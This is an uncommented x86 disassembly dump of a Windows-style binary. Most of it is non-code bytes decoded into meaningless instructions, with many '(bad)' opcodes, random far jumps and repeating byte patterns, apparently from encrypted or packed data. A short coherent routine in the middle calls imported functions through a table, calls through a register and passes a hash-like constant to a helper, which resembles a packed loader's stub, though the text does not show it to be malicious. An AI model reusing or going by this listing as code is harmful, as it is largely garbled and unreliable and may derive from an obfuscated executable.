  422b12:	jmp    0xa715:0x90f672ce
  422b19:	dec    esp
  422b1a:	inc    ebp
  422b1b:	sub    dh,BYTE PTR [eax-0x3f69e96f]
  422b21:	push   ebp
  422b22:	jns    0x422b64
  422b24:	push   edx
  422b25:	cli    
  422b26:	add    eax,DWORD PTR [ecx+0x61]
  422b29:	dec    ebx
  422b2a:	pop    edi
  422b2b:	fmul   DWORD PTR [eax+0x77]
  422b2e:	(bad)  
  422b2f:	jl     0x422b0b
  422b31:	xor    eax,0xbc23c15c
  422b36:	xchg   edx,eax
  422b37:	fcom   DWORD PTR [ecx]
  422b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b3a:	fisubr WORD PTR [esi-0x2a]
  422b3d:	enter  0xe6dc,0x54
  422b41:	loop   0x422b0f
  422b43:	mov    bl,0x9
  422b45:	into   
  422b46:	jg     0x422b92
  422b48:	adc    bl,cl
  422b4a:	push   ss
  422b4b:	ins    BYTE PTR es:[edi],dx
  422b4c:	jbe    0x422aea
  422b4e:	out    dx,al
  422b4f:	test   al,0xf5
  422b51:	xchg   BYTE PTR [eax-0x5a],al
  422b54:	xor    eax,0x2c5e7110
  422b59:	dec    ebx
  422b5a:	(bad)  
  422b5b:	mov    cs,ebx
  422b5d:	mov    ebp,0x6807447c
  422b62:	xchg   ebx,eax
  422b63:	sbb    ch,BYTE PTR [ecx+0x1b]
  422b66:	mov    esi,0xc449edd4
  422b6b:	sbb    DWORD PTR [ecx],ecx
  422b6d:	(bad)  
  422b6e:	shr    BYTE PTR [esp+esi*2-0x5ca5c320],1
  422b75:	imul   edi,DWORD PTR [eax],0xffffffbe
  422b78:	call   0xfd549fb8
  422b7d:	and    al,BYTE PTR [ebx-0x42]
  422b80:	jmp    0x9edb:0xd0962919
  422b87:	push   ebx
  422b88:	(bad)  
  422b89:	fild   WORD PTR [eax+0x2]
  422b8c:	cmp    DWORD PTR [edx+0x6],eax
  422b8f:	lods   eax,DWORD PTR ds:[esi]
  422b90:	mov    ds:0x37f28d78,al
  422b95:	push   0x8eb0bf78
  422b9a:	pop    edx
  422b9b:	xor    esp,DWORD PTR [edx-0x4b]
  422b9e:	adc    cl,BYTE PTR [edi*8+0x162a5212]
  422ba5:	cs and al,0xaa
  422ba8:	mov    al,ds:0x8212db19
  422bad:	jmp    FWORD PTR [ebx]
  422baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bb0:	pop    ebx
  422bb1:	lea    ecx,[edx-0x76]
  422bb4:	lods   al,BYTE PTR ds:[esi]
  422bb5:	test   al,0x31
  422bb7:	mov    eax,ds:0xbc6ce32f
  422bbc:	mov    ebp,0x7ade80a4
  422bc1:	popa   
  422bc2:	(bad)  
  422bc3:	mov    eax,0xb53bdaa0
  422bc8:	sahf   
  422bc9:	sub    al,0x78
  422bcb:	jecxz  0x422c16
  422bcd:	pop    ds
  422bce:	daa    
  422bcf:	push   cs
  422bd0:	adc    al,0xe1
  422bd2:	sub    eax,0x50485c36
  422bd7:	rcr    BYTE PTR [edx],cl
  422bd9:	out    dx,al
  422bda:	(bad)  
  422bdb:	mov    ebp,0x8bd2dbc8
  422be0:	dec    edi
  422be1:	mov    fs,WORD PTR [edi-0x5c6aeb02]
  422be7:	cmc    
  422be8:	adc    al,0xbf
  422bea:	and    DWORD PTR ds:0xd161d278,ecx
  422bf0:	jg     0x422ba6
  422bf2:	cmp    DWORD PTR [edi+0xd],edi
  422bf5:	jmp    0x422c25
  422bf7:	pop    ss
  422bf8:	xor    al,0x72
  422bfa:	into   
  422bfb:	pop    esp
  422bfc:	mov    ah,0x8e
  422bfe:	hlt    
  422bff:	mov    edx,DWORD PTR [eax+0x52]
  422c02:	in     al,dx
  422c03:	push   0x4df87a83
  422c08:	rol    DWORD PTR [ebx],0xc7
  422c0b:	mov    edi,0xa6be4891
  422c10:	aad    0x96
  422c12:	jg     0x422bbf
  422c14:	(bad)  
  422c15:	mov    cl,0x61
  422c17:	mov    dl,0xea
  422c19:	adc    DWORD PTR [ebx+0x3f8e745d],edx
  422c1f:	mov    dl,0x59
  422c21:	inc    esp
  422c22:	int3   
  422c23:	dec    edi
  422c24:	dec    ebp
  422c25:	loop   0x422c02
  422c27:	test   DWORD PTR [edx],0xb08f62c2
  422c2d:	rcr    BYTE PTR [ebx+0x10],0xf1
  422c31:	test   al,0xfa
  422c33:	(bad)  
  422c34:	fnstcw WORD PTR ds:0xcffc5b3c
  422c3a:	outs   dx,DWORD PTR ds:[esi]
  422c3b:	pop    esi
  422c3c:	lock dec edi
  422c3e:	in     eax,0x1
  422c40:	mov    cl,0xa9
  422c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c43:	ss out 0x53,al
  422c46:	xor    al,0xc0
  422c48:	xchg   DWORD PTR [ecx],ebp
  422c4a:	ret    
  422c4b:	jecxz  0x422c8b
  422c4d:	pop    edx
  422c4e:	inc    DWORD PTR [edi]
  422c50:	jecxz  0x422be7
  422c52:	or     ecx,esi
  422c54:	sub    eax,0x3ace26a1
  422c59:	mov    ebx,0x61900170
  422c5e:	sbb    al,0xd1
  422c60:	enter  0xfc79,0x2b
  422c64:	arpl   WORD PTR [ecx],bp
  422c66:	imul   DWORD PTR [edi]
  422c68:	xchg   edi,eax
  422c69:	xchg   ebp,eax
  422c6a:	cwde   
  422c6b:	test   al,0x5f
  422c6d:	pop    es
  422c6e:	into   
  422c6f:	and    DWORD PTR [ebp-0x2b],edi
  422c72:	mov    DWORD PTR [edx+0x66],esp
  422c75:	mov    ds:0xd11fa251,al
  422c7a:	ins    BYTE PTR es:[edi],dx
  422c7b:	out    dx,eax
  422c7c:	out    0x2,eax
  422c7e:	dec    ebx
  422c7f:	xor    ebp,ebp
  422c81:	cmp    eax,0x6c54375d
  422c86:	jne    0x422cb0
  422c88:	call   0xadcf:0x565fd636
  422c8f:	xchg   ebx,eax
  422c90:	push   esi
  422c91:	adc    ah,cl
  422c93:	leave  
  422c94:	rcr    al,cl
  422c96:	out    dx,al
  422c97:	push   0x9
  422c99:	adc    BYTE PTR [ebx-0x47],0xc8
  422c9d:	jmp    0xf66d:0xa6f6ce45
  422ca4:	pop    ebp
  422ca5:	jge    0x422c34
  422ca7:	push   ebp
  422ca8:	sub    DWORD PTR [eax],esi
  422caa:	aad    0xf3
  422cac:	mov    dh,0xdd
  422cae:	mov    dl,0xe3
  422cb0:	mov    bh,0x44
  422cb2:	xor    eax,0x9d95b63e
  422cb7:	(bad)  
  422cb8:	sbb    bl,BYTE PTR [edx+0x135d813]
  422cbe:	mov    eax,0xdb4c115
  422cc3:	cmp    edx,DWORD PTR [ebx-0xf7e7ab]
  422cc9:	pop    ebp
  422cca:	jne    0x422ce0
  422ccc:	xor    al,0xf0
  422cce:	lahf   
  422ccf:	add    edx,ecx
  422cd1:	(bad)  
  422cd2:	or     ebp,DWORD PTR [esi+0x361b7ab]
  422cd8:	jl     0x422d00
  422cda:	call   0x40c7:0xa22a59ba
  422ce1:	dec    edi
  422ce2:	push   esp
  422ce3:	adc    DWORD PTR [edi],edx
  422ce5:	sub    bl,BYTE PTR [ebx+edi*8-0x4b]
  422ce9:	sub    BYTE PTR [esi+0x25a6be96],al
  422cef:	pop    ecx
  422cf0:	js     0x422cfb
  422cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cf3:	inc    ebx
  422cf4:	inc    eax
  422cf5:	popf   
  422cf6:	mov    al,ds:0x609e6751
  422cfb:	es jmp 0x422d19
  422cfe:	adc    al,0x9e
  422d00:	mov    al,0x7
  422d02:	dec    edi
  422d03:	ss jno 0x422cc6
  422d06:	add    eax,0xc91ce2c3
  422d0b:	loop   0x422d86
  422d0d:	inc    esp
  422d0e:	push   es
  422d0f:	aam    0x66
  422d11:	sub    eax,DWORD PTR [ebx-0x4b6574ae]
  422d17:	and    cl,BYTE PTR [eax-0x2dbc4fa8]
  422d1d:	jecxz  0x422d01
  422d1f:	adc    dl,0x35
  422d22:	inc    ecx
  422d23:	mov    ebp,0xd829e748
  422d28:	or     BYTE PTR [edx-0x2b56b008],0xce
  422d2f:	ror    BYTE PTR [ebx-0x56],1
  422d32:	sub    cl,0x6d
  422d35:	jns    0x422d80
  422d37:	sbb    dh,BYTE PTR [ecx-0x4a]
  422d3a:	mov    cs,ebp
  422d3c:	in     eax,dx
  422d3d:	call   0x5dcf47aa
  422d42:	mov    edi,0x6f00aef7
  422d47:	mov    al,0x26
  422d49:	cli    
  422d4a:	adc    eax,0x53235879
  422d4f:	sbb    BYTE PTR [eax+0x4bf3f0c5],0x9d
  422d56:	mov    edx,0xcb2e2316
  422d5b:	test   BYTE PTR [ebx],bh
  422d5d:	call   0xa2c5:0x226e04db
  422d64:	mov    ebp,0x35b7abae
  422d69:	call   0xf3fd:0xd5d83959
  422d70:	ds out dx,al
  422d72:	mov    ah,0xed
  422d74:	jmp    0x422dbc
  422d76:	add    DWORD PTR [ebx],ecx
  422d78:	pusha  
  422d79:	ja     0x422d47
  422d7b:	mov    edi,0xdaec0414
  422d80:	push   cs
  422d81:	and    al,dl
  422d83:	ds jecxz 0x422dea
  422d86:	xor    ebx,eax
  422d88:	cdq    
  422d89:	pop    ebp
  422d8a:	fdiv   QWORD PTR [eax]
  422d8c:	sbb    ebp,esi
  422d8e:	or     al,0xb
  422d90:	cmp    al,0x3e
  422d92:	and    al,0xc9
  422d94:	scas   eax,DWORD PTR es:[edi]
  422d95:	aas    
  422d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d97:	cmc    
  422d98:	repz jmp 0xcb09:0x33ffeed0
  422da0:	jmp    0x422dd6
  422da2:	loop   0x422d83
  422da4:	mov    edi,0x58ba289c
  422da9:	cmp    BYTE PTR [ebp+0x5189cbc2],dh
  422daf:	bound  edx,QWORD PTR [ecx]
  422db1:	call   0x3c466df1
  422db6:	lock and BYTE PTR [edx],bl
  422db9:	cld    
  422dba:	rcl    al,0xa3
  422dbd:	(bad)  
  422dbe:	jmp    0x24e2:0xb6dd2c02
  422dc5:	leave  
  422dc6:	aam    0xbb
  422dc8:	test   DWORD PTR [esi+0x604913fa],esi
  422dce:	loop   0x422e02
  422dd0:	xchg   edx,eax
  422dd1:	jnp    0x422e48
  422dd3:	frstpm(287 only) 
  422dd5:	fcmovu st,st(0)
  422dd7:	adc    BYTE PTR [edx+0x65],dh
  422dda:	or     DWORD PTR ds:0x4bc50584,edx
  422de0:	popf   
  422de1:	inc    ecx
  422de2:	mov    edx,0xe21ea7d3
  422de7:	pusha  
  422de8:	inc    edx
  422de9:	dec    edi
  422dea:	cmc    
  422deb:	dec    edi
  422dec:	(bad)  
  422ded:	xchg   ecx,eax
  422dee:	test   al,0x12
  422df0:	sahf   
  422df1:	repnz dec esi
  422df3:	and    bl,BYTE PTR [ecx+ebx*4-0x4]
  422df7:	jmp    0x5cea3266
  422dfc:	stos   BYTE PTR es:[edi],al
  422dfd:	and    BYTE PTR [edi-0x52],dh
  422e00:	out    0x6c,al
  422e02:	xchg   BYTE PTR [eax-0x5b],dh
  422e05:	das    
  422e06:	xor    BYTE PTR [edi],bl
  422e08:	push   eax
  422e09:	sahf   
  422e0a:	pushf  
  422e0b:	sub    BYTE PTR [edi-0x518b77f4],bh
  422e11:	push   ss
  422e12:	dec    ebp
  422e13:	mov    edi,0xb4c69630
  422e18:	or     ecx,DWORD PTR [ebp+0x34]
  422e1b:	push   esi
  422e1c:	pop    ds
  422e1d:	inc    esi
  422e1e:	stos   DWORD PTR es:[edi],eax
  422e1f:	dec    ebx
  422e20:	std    
  422e21:	and    ebx,esi
  422e23:	sbb    DWORD PTR [edi-0x1dbf9da5],0x56
  422e2a:	mov    ah,0xdc
  422e2c:	call   0x4185:0x2fda2275
  422e33:	and    bh,al
  422e35:	dec    ebp
  422e36:	xchg   esi,eax
  422e37:	push   esi
  422e38:	dec    ecx
  422e39:	(bad)  
  422e3a:	cld    
  422e3b:	fcmovnu st,st(1)
  422e3d:	pop    edi
  422e3e:	test   DWORD PTR [ecx+0x76],0x13ae3d37
  422e45:	add    eax,0x898e92bc
  422e4a:	jnp    0x422dfc
  422e4c:	sar    BYTE PTR [ecx+0x6e],cl
  422e4f:	out    0x14,eax
  422e51:	call   0x217d3276
  422e56:	or     eax,DWORD PTR [edi-0x119a0408]
  422e5c:	adc    DWORD PTR [esi+0x18],0xaa4bb42a
  422e63:	popa   
  422e64:	lahf   
  422e65:	xor    BYTE PTR [edx+0x5d],ch
  422e68:	sbb    DWORD PTR [ecx+edx*4+0x70],esi
  422e6c:	mov    dh,0x7d
  422e6e:	arpl   WORD PTR [ecx],ax
  422e70:	or     BYTE PTR [edi-0x45ff81d2],bl
  422e76:	push   edi
  422e77:	imul   eax,DWORD PTR [esi],0xbd780f9
  422e7d:	jl     0x422e7e
  422e7f:	xor    esi,DWORD PTR [edi]
  422e81:	pop    ebp
  422e82:	loop   0x422eef
  422e84:	inc    ebp
  422e85:	imul   edi,DWORD PTR [edx+ecx*2+0x1c],0xed2f99e6
  422e8d:	sub    eax,0x6ea2e885
  422e92:	dec    esp
  422e93:	push   0xa793be29
  422e98:	icebp  
  422e99:	repz fbld TBYTE PTR [esi-0x71]
  422e9d:	jno    0x422e7a
  422e9f:	cmp    eax,0xdaa806db
  422ea4:	jecxz  0x422f05
  422ea6:	pop    ds
  422ea7:	xor    BYTE PTR [esi-0x1160e895],bl
  422ead:	jns    0x422e86
  422eaf:	and    al,0x82
  422eb1:	mov    edx,0x938dd7fd
  422eb6:	xrelease xchg BYTE PTR [ebx+esi*1+0x7051c61d],ch
  422ebe:	xor    al,0x4d
  422ec0:	fstp   DWORD PTR [eax]
  422ec2:	cwde   
  422ec3:	rcr    DWORD PTR [eax-0x7522093b],cl
  422ec9:	sysexit 
  422ecb:	add    al,0x9
  422ecd:	push   esp
  422ece:	fnstsw WORD PTR [eax]
  422ed0:	mul    al
  422ed2:	xor    al,0x44
  422ed4:	loop   0x422f14
  422ed6:	retf   
  422ed7:	jecxz  0x422f16
  422ed9:	pop    es
  422eda:	sub    eax,0xf281866e
  422edf:	sbb    al,0x53
  422ee1:	jecxz  0x422ee9
  422ee3:	add    BYTE PTR [esi+ebx*4-0x12],ch
  422ee7:	aas    
  422ee8:	sub    DWORD PTR [ebx-0xfebd8e2],0xebd0e585
  422ef2:	or     eax,0xa7016968
  422ef7:	scas   eax,DWORD PTR es:[edi]
  422ef8:	add    DWORD PTR [edx],0x67
  422efb:	cmp    ch,dl
  422efd:	add    eax,0xab0af041
  422f02:	mov    ah,0x2c
  422f04:	pop    ebx
  422f05:	test   esi,edi
  422f07:	fs inc eax
  422f09:	and    DWORD PTR [ebp-0x48],edx
  422f0c:	xor    BYTE PTR [esi-0x35],al
  422f0f:	dec    eax
  422f10:	push   ss
  422f11:	dec    edx
  422f12:	mov    bh,BYTE PTR [edi+0x2bf48573]
  422f18:	xchg   edx,eax
  422f19:	sbb    al,0x83
  422f1b:	rcr    BYTE PTR [edx],1
  422f1d:	pop    ebx
  422f1e:	js     0x422eca
  422f20:	mov    al,ds:0xeb95ff7f
  422f25:	in     al,0xfc
  422f27:	out    dx,eax
  422f28:	into   
  422f29:	and    edx,edi
  422f2b:	xchg   edi,eax
  422f2c:	lahf   
  422f2d:	add    dh,dl
  422f2f:	jo     0x422f87
  422f31:	push   eax
  422f32:	lahf   
  422f33:	mov    fs,eax
  422f35:	pop    ebp
  422f36:	rol    DWORD PTR [ecx+eiz*1+0x60],cl
  422f3a:	lods   al,BYTE PTR ds:[esi]
  422f3b:	popf   
  422f3c:	mov    cl,0x25
  422f3e:	add    eax,0xe6b8c66b
  422f43:	pusha  
  422f44:	push   ebx
  422f45:	call   0xb9d102d
  422f4a:	inc    edx
  422f4b:	push   ebp
  422f4c:	pop    es
  422f4d:	xor    BYTE PTR [esi],dl
  422f4f:	mov    al,ds:0x2ee9e760
  422f54:	adc    dh,BYTE PTR [edx]
  422f56:	call   FWORD PTR [edx-0x3e327da3]
  422f5c:	adc    al,0xe9
  422f5e:	cwde   
  422f5f:	jecxz  0x422fcf
  422f61:	shl    BYTE PTR [esi-0x69631003],1
  422f67:	out    dx,eax
  422f68:	inc    ecx
  422f69:	dec    ebp
  422f6a:	std    
  422f6b:	xchg   esi,eax
  422f6c:	dec    edx
  422f6d:	push   esi
  422f6e:	ret    
  422f6f:	outs   dx,BYTE PTR ds:[esi]
  422f70:	dec    edi
  422f71:	sar    eax,cl
  422f73:	inc    ebx
  422f74:	cmp    esp,eax
  422f76:	(bad)  
  422f77:	out    0xd4,al
  422f79:	dec    ebp
  422f7a:	mov    eax,0x1
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0xb8bee324
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	dec    DWORD PTR [ebx+ebx*8+0x72]
  42309c:	or     al,0x85
  42309e:	test   BYTE PTR [eax+0x47],dh
  4230a1:	pop    ds
  4230a2:	jbe    0x423072
  4230a4:	pop    esi
  4230a5:	aas    
  4230a6:	inc    BYTE PTR [ecx-0x7b794b1e]
  4230ac:	jo     0x4230f5
  4230ae:	sbb    esi,DWORD PTR [esi-0x32]
  4230b1:	push   ds
  4230b2:	rol    BYTE PTR [ecx],0x81
  4230b5:	loop   0x4230c3
  4230b7:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4230be:	pop    esi
  4230bf:	rol    BYTE PTR [ecx],0x81
  4230c2:	loop   0x4230d0
  4230c4:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4230cb:	pop    esi
  4230cc:	rol    BYTE PTR [ecx],0x81
  4230cf:	loop   0x4230dd
  4230d1:	xchg   BYTE PTR [eax+esi*2-0x31891cb9],al
  4230d8:	pop    esi
  4230d9:	into   
  4230da:	push   ds
  4230db:	cmp    ebp,esp
  4230dd:	or     al,0x32
  4230df:	lea    edi,[ebp-0x7d885c9a]
  4230e5:	xchg   ebx,eax
  4230e6:	loope  0x42313d
  4230e8:	jmp    0xf4e8b078
  4230ed:	add    ch,BYTE PTR [eax]
  4230ef:	jl     0x4230f5
  4230f1:	scas   eax,DWORD PTR es:[edi]
  4230f2:	xor    esp,eax
  4230f4:	(bad)  
  4230f5:	loopne 0x423083
  4230f7:	(bad)  
  4230f8:	jmp    0x7e6781ed
  4230fd:	push   esi
  4230fe:	mov    esp,0xe821ae2b
  423103:	mov    WORD PTR [edx+eax*8],gs
  423106:	retf   
  423107:	and    esp,DWORD PTR [edi+0x76]
  42310a:	sbb    DWORD PTR [edx-0x73f311c5],ebp
  423110:	call   0x70c6b73d
  423115:	inc    edi
  423116:	sbb    esi,DWORD PTR [esi-0x32]
  423119:	pop    ecx
  42311a:	pop    ecx
  42311b:	std    
  42311c:	fsub   DWORD PTR [ecx+0x338e14f4]
  423122:	mov    edi,0xa68d7c89
  423127:	push   edx
  423128:	or     ebx,ecx
  42312a:	xchg   DWORD PTR [eax],eax
  42312c:	mov    ebx,ds
  42312e:	mov    ch,dl
  423130:	adc    DWORD PTR [esi],ebp
  423132:	stos   DWORD PTR es:[edi],eax
  423133:	retfw  0x79c3
  423137:	jo     0x42313f
  423139:	fsubrp st(1),st
  42313b:	dec    ecx
  42313c:	dec    ebp
  42313d:	jae    0x4230cd
  42313f:	pop    esp
  423140:	push   esp
  423141:	in     al,dx
  423142:	(bad)  
  423143:	mov    eax,0x167e4ae8
  423148:	jp     0x423157
  42314a:	fwait
  42314b:	les    edx,FWORD PTR [si]
  42314e:	cmp    BYTE PTR [ebx-0x78735775],dl
  423154:	mov    gs,WORD PTR [eax]
  423156:	mov    edi,0xa68d7c89
  42315b:	push   ebx
  42315c:	or     ebp,DWORD PTR [ecx+0x3b8c9e1b]
  423162:	test   al,0xc7
  423164:	adc    DWORD PTR [ebx],edi
  423166:	ss int3 
  423168:	retf   0xe459
  42316b:	fild   WORD PTR [esi]
  42316d:	mov    ?,WORD PTR [edx+eiz*8+0x4d]
  423171:	inc    ebx
  423172:	adc    eax,esi
  423174:	push   esp
  423175:	cmp    cl,0x13
  423178:	call   0x7ace14d1
  42317d:	add    eax,0xcc4e4e3
  423182:	test   eax,0xf4a1e962
  423187:	adc    al,0x8e
  423189:	jo     0x4231d2
  42318b:	sbb    esi,DWORD PTR [esi-0x32]
  42318e:	pop    esi
  42318f:	rol    BYTE PTR [ecx],0xd1
  423192:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423193:	or     al,0x86
  423195:	enter  0x4571,0x1b
  423199:	call   0xe281:0x18f012d
  4231a0:	or     al,0x86
  4231a2:	test   BYTE PTR [eax+0x47],dh
  4231a5:	sti    
  4231a6:	jbe    0x423175
  4231a8:	pop    edi
  4231a9:	retf   
  4231aa:	add    BYTE PTR [ebx-0x7f95f31e],cl
  4231b0:	jo     0x4231f9
  4231b2:	pop    ds
  4231b3:	jo     0x423183
  4231b5:	pop    esi
  4231b6:	rol    BYTE PTR [ecx],0x81
  4231b9:	jecxz  0x42316c
  4231bb:	xchg   BYTE PTR [eax+esi*2-0x3189e4a9],al
  4231c2:	pop    esi
  4231c3:	lds    eax,FWORD PTR [ecx]
  4231c5:	and    edx,0x6084864d
  4231cb:	inc    edi
  4231cc:	sbb    esi,DWORD PTR [esi-0x34]
  4231cf:	pop    esi
  4231d0:	rol    BYTE PTR [ecx+eax*4],0xe3
  4231d4:	or     al,0x86
  4231d6:	test   BYTE PTR [eax+0x47],dh
  4231d9:	push   ds
  4231da:	jbe    0x4231ab
  4231dc:	pop    esi
  4231dd:	rol    BYTE PTR [ecx],0x81
  4231e0:	loop   0x4231ee
  4231e2:	push   es
  4231e3:	(bad)  
  4231e4:	jo     0x42322d
  4231e6:	pop    ds
  4231e7:	jbe    0x4231b7
  4231e9:	jecxz  0x4231dc
  4231eb:	add    al,0x81
  4231ed:	loopne 0x4231fb
  4231ef:	xchg   BYTE PTR [eax+esi*2],al
  4231f2:	inc    edi
  4231f3:	or     esi,DWORD PTR [esi-0x32]
  4231f6:	dec    esi
  4231f7:	rol    BYTE PTR [ecx],0x81
  4231fa:	loop   0x423218
  4231fc:	xchg   BYTE PTR [eax+eiz*2-0x3189e4b9],al
  423203:	pop    esi
  423204:	rcl    BYTE PTR [ecx],0x81
  423207:	loop   0x423215
  423209:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423210:	pop    esi
  423211:	inc    esp
  423212:	outs   dx,DWORD PTR ds:[esi]
  423213:	mov    ah,dl
  423215:	test   DWORD PTR gs:[eax+esi*2-0x3182d4b9],eax
  42321d:	xchg   ecx,eax
  42321e:	std    
  42321f:	add    DWORD PTR [ecx-0x7b79f31e],eax
  423225:	jo     0x42326e
  423227:	sbb    esi,DWORD PTR [esi-0x32]
  42322a:	pop    esi
  42322b:	rol    BYTE PTR [ecx],0x81
  42322e:	loop   0x42323c
  423230:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423237:	pop    esi
  423238:	rol    BYTE PTR [ecx],0x81
  42323b:	loop   0x423249
  42323d:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423244:	pop    esi
  423245:	rol    BYTE PTR [ecx],0x81
  423248:	loop   0x423256
  42324a:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423251:	pop    esi
  423252:	rol    BYTE PTR [ecx],0x81
  423255:	loop   0x423263
  423257:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42325e:	pop    esi
  42325f:	rol    BYTE PTR [ecx],0x81
  423262:	loop   0x423270
  423264:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42326b:	pop    esi
  42326c:	rol    BYTE PTR [ecx],0x81
  42326f:	loop   0x42327d
  423271:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423278:	pop    esi
  423279:	rol    BYTE PTR [ecx],0x81
  42327c:	loop   0x42328a
  42327e:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423285:	pop    esi
  423286:	rol    BYTE PTR [ecx],0x81
  423289:	int3   
  42328a:	js     0x42326f
  42328c:	cld    
  42328d:	add    al,0x47
  42328f:	sbb    esi,DWORD PTR [esi-0x32]
  423292:	jle    0x42325f
  423294:	add    DWORD PTR [ecx-0x7b79f30e],eax
  42329a:	dec    edx
  42329b:	inc    ebx
  42329c:	sbb    esi,DWORD PTR [esi-0x36]
  42329f:	pop    esi
  4232a0:	rcl    BYTE PTR [ecx-0x3c],0xa1
  4232a4:	ds ror bl,cl
  4232a7:	jo     0x4232f0
  4232a9:	sbb    esi,DWORD PTR [esi-0x32]
  4232ac:	pop    esi
  4232ad:	loopne 0x4232b0
  4232af:	add    DWORD PTR [edx],0x2f7f422
  4232b5:	and    al,0x1b
  4232b7:	jbe    0x423287
  4232b9:	pop    esi
  4232ba:	nop
  4232bb:	add    DWORD PTR [ecx-0x7b72c31e],eax
  4232c1:	jo     0x4232da
  4232c3:	sbb    esi,DWORD PTR [esi-0x32]
  4232c6:	pusha  
  4232c7:	les    eax,FWORD PTR [ecx]
  4232c9:	and    edx,0x7084860c
  4232cf:	inc    edi
  4232d0:	sbb    esi,DWORD PTR [esi-0x32]
  4232d3:	pop    esi
  4232d4:	shl    BYTE PTR [ecx],0x81
  4232d7:	loop   0x4232c5
  4232d9:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4232e0:	pop    esi
  4232e1:	rol    BYTE PTR [ecx],0x81
  4232e4:	loop   0x4232f2
  4232e6:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4232ed:	pop    esi
  4232ee:	rol    BYTE PTR [ecx],0x81
  4232f1:	loop   0x4232ff
  4232f3:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  4232fa:	pop    esi
  4232fb:	rol    BYTE PTR [ecx],0x81
  4232fe:	loop   0x42330c
  423300:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423307:	pop    esi
  423308:	rol    BYTE PTR [ecx],0x81
  42330b:	loop   0x423319
  42330d:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423314:	pop    esi
  423315:	rol    BYTE PTR [ecx],0x81
  423318:	loop   0x423326
  42331a:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423321:	pop    esi
  423322:	rol    BYTE PTR [ecx],0x81
  423325:	loop   0x423333
  423327:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42332e:	pop    esi
  42332f:	rol    BYTE PTR [ecx],0x81
  423332:	loop   0x423340
  423334:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  42333b:	pop    esi
  42333c:	rol    BYTE PTR [ecx],0x81
  42333f:	loop   0x42334d
  423341:	xchg   BYTE PTR [eax+esi*2-0x3189e4b9],al
  423348:	pop    esi
  423349:	rol    BYTE PTR [ecx],0x81
  42334c:	loop   0x42335a
